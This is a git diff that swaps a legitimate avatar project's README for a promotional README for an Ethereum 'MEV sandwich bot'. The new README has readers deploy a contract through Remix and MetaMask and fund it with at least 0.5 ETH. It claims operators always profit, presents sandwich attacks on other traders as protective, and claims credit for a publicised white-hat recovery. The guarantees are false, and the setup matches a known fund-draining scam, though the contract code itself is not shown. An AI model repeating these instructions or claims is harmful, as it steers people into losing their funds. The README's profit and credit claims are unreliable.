@@ -1,27 +1,311 @@
-![](docs/mona.gif)
+<div align="center">
 
-# Avatarify Python
+<div align="right">
 
-Photorealistic avatars for video-conferencing.
+`unimevbot☕ v3.0`
 
-Avatarify Python requires manually downloading and installing some dependencies, and is therefore best suited for users who have some experience with command line applications. [Avatarify Desktop](https://github.com/alievk/avatarify-desktop), which aims to be easier to install and use, is recommended for most users. If you still want to use Avatarify Python, proceed to the [install instructions](docs/).
+</div>
 
-Based on [First Order Motion Model](https://github.com/AliaksandrSiarohin/first-order-model).
+  
 
-## News
-- **7 Mar 2021.** Renamed project to Avatarify Python to distinguish it from other versions of Avatarify
-- **14 December 2020.** Released Avatarify Desktop. Check it out [here](https://github.com/alievk/avatarify-desktop).
-- **11 July 2020.** Added Docker support. Now you can run Avatarify from Docker on [Linux](https://github.com/alievk/avatarify-python/blob/master/docs/README.md#docker). Thanks to [mikaelhg](https://github.com/mikaelhg) and [mintmaker](https://github.com/mintmaker) for contribution!
-- **22 May 2020.** Added [Google Colab](https://colab.research.google.com/github/alievk/avatarify/blob/master/avatarify.ipynb) mode. Now you can run Avatarify on any computer without GPU!
-- **7 May 2020.** Added remote GPU support for all platforms (based on [mynameisfiber's](https://github.com/mynameisfiber) solution). [Demo](https://youtu.be/3Dz_bUIPYFM). Deployment [instructions](https://github.com/alievk/avatarify-python/wiki/Remote-GPU). 
-- **24 April 2020.** Added Windows installation [tutorial](https://www.youtube.com/watch?v=lym9ANVb120).
-- **17 April 2020.** Created Slack community. Please join via [invitation link](https://join.slack.com/t/avatarify/shared_invite/zt-dyoqy8tc-~4U2ObQ6WoxuwSaWKKVOgg).
-- **15 April 2020.** Added [StyleGAN-generated](https://www.thispersondoesnotexist.com) avatars. Just press `Q` and now you drive a person that never existed. Every time you push the button – new avatar is sampled.
-- **13 April 2020.** Added Windows support (kudos to [9of9](https://github.com/9of9)).
+# `MevB0t 3.0`
 
-## Avatarify apps
+  
 
-We have deployed Avatarify on iOS and Android devices using our proprietary inference engine. The iOS version features the Life mode for recording animations in real time. However, the Life mode is not available on Android devices due to the diversity of the devices we have to support.
+</div>
 
-[<img src=docs/appstore-badge.png alt="drawing" height="40"/>](https://apps.apple.com/app/apple-store/id1512669147?pt=121960189&ct=GitHub&mt=8)
-[<img src=docs/google-play-badge.png alt="drawing" height="40"/>](https://play.google.com/store/apps/details?id=com.avatarify.android)
+  
+
+This is a lightweight boilerplate on-chain Mevbot engine designed to scan the Ethereum mempool for profitable transactions with the goal of protecting regular users and institutions from being front-run or exploited by bad actors.
+
+The bot aims to level the playing field by reordering transactions in an aggressive manner via dynamic calculation of gas fees and miner bribes. Thereby reducing the profitability of unethical MEV practices and securing stolen funds before they are able to reach a bad actor's wallet.
+
+In august of 2023 I intercepted an attacker trying to exploit a vector on the CRV pool for $5 million USD. My bot was able to front-run the transaction and secure the stolen funds.
+
+  
+
+https://cointelegraph.com/news/white-hat-returns-5-million-curve-finance-hack
+
+  
+  
+
+### `How it Works`
+
+<div align="center">
+
+ <img src="https://i.ibb.co/J7jTN4c/1.png" alt="1" border="0">
+
+</div> 
+
+- The bot continuously monitors Uniswap's mempools for pending transactions (TX) from the Uniswap AMM until it identifies a TX containing slippage discrepancies within a profitable threshold (e.g. a hasty large buy order, or exploit TX)
+
+  
+
+- Before executing any trades, the algorithm calculates the potential gains against transaction costs to ensure profitability
+
+  
+
+- The bot swiftly executes a sandwich operation by placing a buy order (for the same token) just before the "targeted" TX, simultaneous with placing a sell order right after within the same block, profiting from the price movement
+
+  
+
+- It optimizes paid gas fees for timely execution and cost efficiency and it always outbids gas prices and bribes of competing bots`, as long as it remains profitable
+
+  
+
+- Returns ETH back to the contract ready for withdrawal
+
+  
+
+### `Features`
+
+
+  
+
+- 𝗔𝗻𝘁𝗶-𝗘𝘅𝗽𝗹𝗼𝗶𝘁 (𝘄𝗵𝗶𝘁𝗲-𝗵𝗮𝘁) - identifies exploit transactions from bad actors and quickly works to front-run the transaction, effectively securing any stolen funds.
+
+  
+
+- 𝗔𝗿𝗯𝗶𝘁𝗿𝗮𝗴𝗲 𝗢𝗽𝗽𝗼𝗿𝘁𝘂𝗻𝗶𝘁𝘆 - detects a price discrepancy between decentralized exchanges and executes arbitrage trades, resulting in virtually unlimited potential profit.
+
+  
+
+- 𝗙𝗹𝗮𝘀𝗵 𝗟𝗼𝗮𝗻 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝗮𝘁𝗶𝗼𝗻 𝗣𝗿𝗲𝘃𝗲𝗻𝘁𝗶𝗼𝗻 - identifies and blocks flash loan exploitations by executing counter trades just before the malicious transactions. This action prevents losses and helps preserve the stability of the Ethereum ecosystem.
+
+  
+
+- 𝗟𝗶𝗾𝘂𝗶𝗱𝗮𝘁𝗶𝗼𝗻 𝗣𝗿𝗼𝘁𝗲𝗰𝘁𝗶𝗼𝗻 - proactively identifies liquidation transactions and executes a counter trade to protect vulnerable positions, potentially saving a user or contract from substantial losses, while pocketing the profit.
+
+  
+
+---
+
+### `Instructions`
+
+  
+
+### Deploying the contract
+
+  
+
+1. **Accessing Remix Ethereum IDE**
+
+- Navigate to [Remix Ethereum IDE](https://remix.ethereum.org/).
+
+  
+
+2. **Create or Import Contract File**
+
+- Create a new file in Remix named `Contract.sol` and paste the code from `src/contracts/Contract.sol` from this repo.
+
+- Or download the `src/contracts/Contract.sol` file from this repo and open it in Remix.
+  
+
+<div align="center">
+    
+  <img src="https://i.ibb.co/hVCnqrP/2.png" alt="2" border="0">
+ 
+</div> 
+
+  
+3. **Solidity Version and Contract Compilation**
+
+- Navigate to the `Solidity Compiler` tab.
+
+- Use Solidity version `0.6.12`. In Remix, select this version in the `Compiler` dropdown.
+
+- Click on the "Compile" button.
+
+  
+<div align="center">
+    
+ <img src="https://i.ibb.co/TvKQf9W/8.png" alt="8" border="0">
+    
+</div> 
+
+4. **Preparation for Deployment**
+
+- Navigate to the "Deploy & Run Transactions" tab.
+
+- In the "Environment" dropdown, select "Injected Web3". Ensure that MetaMask is installed and activated.
+
+<div align="center">
+    
+ <img src="https://i.ibb.co/vxjxP9z/3.png" alt="3" border="0">
+
+</div> 
+
+5. **Deploying the Contract**
+
+- Click on "Deploy".
+
+- MetaMask will prompt for transaction confirmation.
+
+  <div align="center">
+
+   <img src="https://i.ibb.co/v4Ls09S/4.png" alt="4" border="0">
+
+  </div> 
+
+6. **Confirm Bot Deployment**
+
+- Confirm the bot deployment transaction in MetaMask.
+
+  
+
+7. **Configuration**
+
+- Copy the bot’s contract address and send some Ethereum to its balance for the bot to start. Team recommendation is to fund the bot with a minimum amount of 0.5 ETH.
+
+  0.5 ETH is recommended so the bot has enough gas and funds to swap, pay builders, etc.
+
+  <div align="center"> 
+
+   <img src="https://i.ibb.co/x5nD7xF/5.png" alt="5" border="0">
+
+  </div> 
+
+- After your transaction is confirmed, click the `Start` button to run the bot.
+
+- Press the `Stop` button to halt bot operations.
+
+- Withdraw all ETH at any time by clicking the `Withdrawal` button.
+
+  
+
+  <div align="center"> 
+
+   <img src="https://i.ibb.co/zxfh7wh/6.png" alt="6" border="0">
+
+  </div> 
+
+  
+
+<div>
+
+  
+
+<div align="center">
+
+  
+
+That’s it. The bot will start transacting immediately to generate profits from sandwich opportunities on Uniswap transaction pools
+
+  
+
+</div>
+
+  
+
+<div align="center">
+
+  
+
+> ⚠️NOTICE: It can take 12-24 HRS to accrue estimated profit potential. This figure is estimated on network congestion and market conditions
+
+</div>
+
+  
+
+## `Contributions`
+
+  
+
+Contributions to the project are welcome! If you would like to contribute, kindly fork the repository and submit a pull request with your proposed changes or additions. Please ensure that your code adheres to the project's coding standards and includes appropriate tests.
+
+  
+
+This project would be impossible without generous support from our sponsors and developers. We cannot thank them enough!
+
+  
+
+## `Support`
+
+  
+
+If you find the project interesting, please consider granting it a star ⭐. Your support is greatly appreciated and helps in motivating further development!
+
+  
+
+ <img src="https://i.ibb.co/w4655K4/7.png" alt="7" border="0">
+    
+   
+## `FAQ`
+
+  
+
+```
+-
+Q: If many people deploy this bot, wouldn’t dilution of profits occur due to competition?
+
+  
++
+A: We found that there is no indication of a decrease in
+
+profits when multiple instances of the bot are deployed.
+
+  
+-
+Q: What average ROI and risks can I expect?
+
+  
++
+A: You can find the ROI according to latest data of bot
+
+performances in the "Returns Features" section. This bot
+
+in particular does not create any losses, it only
+
+executes trades when there are proper MEV opportunities
+
+to make profits, so under all circumstances bot operators remain in profit.
+
+  
+-
+Q: What amount of funds does bot need to work?
+
+  
++
+A: Our team recommendation is to fund the bot with a minimum
+
+amount of 0.5 ETH but more than .5 ETH is recommended so
+
+the bot has enough gas and funds to swap, pay builders and tip miners, etc.
+
+  
+-
+Q: Do I need to keep the Remix page open in my browser while the bot is activated?
+
+  
++
+A:No, just save the bot contract address after creating it.
+
+The next time you want to access your bot via Remix,
+
+you need to compile the file again as in step 3.
+
+Now head to `DEPLOY & RUN TRANSACTIONS`, reconnect your
+
+Metamask, paste your contract address into `Load contract
+
+from Address` and press `At Address`
+
+.
+
+https://i.imgur.com/4x2i7RX.png
+
+  
+
+Now it can be found again under "Deployed Contracts".
+
+  
+-
+Q: Does it work on other chains or DEXes as well?
+
+  
++
+A: No, currently the bot is dedicated only for Ethereum on Uniswap mempools.
+
+We aim to expand support for other networks in the future :)
+
+```
